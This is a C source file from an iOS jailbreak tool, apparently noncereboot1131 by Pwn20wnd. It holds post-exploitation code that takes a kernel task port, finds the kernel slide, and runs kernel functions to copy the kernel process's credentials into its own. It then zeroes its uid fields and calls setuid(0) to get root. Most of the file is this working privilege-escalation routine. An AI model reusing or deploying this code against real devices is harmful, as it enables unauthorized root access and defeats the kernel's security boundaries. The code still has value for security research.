//
//  noncereboot.c
//  noncereboot1131UI
//
//  Created by Pwn20wnd on 6/30/18.
//  Copyright Â© 2018 Pwn20wnd. All rights reserved.
//

#include "noncereboot.h"
#include <mach/mach.h>
#include "kmem.h"
#include "kutils.h"
#include "patchfinder64.h"
#include "kexecute.h"

mach_port_t tfpzero = MACH_PORT_NULL;

int start_noncereboot(mach_port_t tfp0) {
    printf("Starting noncereboot1131...\n");
    
    int err = ERR_NOERR;
    
    if (tfp0 == MACH_PORT_NULL) {
        return ERR_TFP0;
    }
    
    tfpzero = tfp0;
    
    uint64_t kernel_base = find_kernel_base();
    
    // Loads the kernel into the patch finder, which just fetches the kernel memory for patchfinder use
    init_kernel(kernel_base, NULL);
    
    // Get the slide
    uint64_t slide = kernel_base - 0xFFFFFFF007004000;
    printf("slide: 0x%016llx\n", slide);
    
    init_kexecute();
    
    // Get our and the kernels struct proc from allproc
    uint32_t our_pid = getpid();
    uint64_t our_proc = get_proc_struct_for_pid(our_pid);
    uint64_t kern_proc = get_proc_struct_for_pid(0);
    
    if (!our_proc || !kern_proc) {
        err = ERR_POST_EXPLOITATION;
        goto out;
    }
    
    printf("our proc is at 0x%016llx\n", our_proc);
    printf("kern proc is at 0x%016llx\n", kern_proc);
    
    // Properly copy the kernel's credentials so setuid(0) doesn't crash
    
    uint64_t copyout = find_copyout();
    uint64_t bcopy = find_bcopy();
    uint64_t bzero = find_bzero();
    
    uint64_t kern_ucred = 0;
    kexecute(copyout, kern_proc+0x100, (uint64_t)&kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    
    uint64_t self_ucred = 0;
    kexecute(copyout, our_proc+0x100, (uint64_t)&self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
    
    kexecute(bcopy, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
    kexecute(bzero, self_ucred + 0x18, 12, 0, 0, 0, 0, 0);
    
    setuid(0);
    
out:
    term_kexecute();
    term_kernel();
    return err;
}
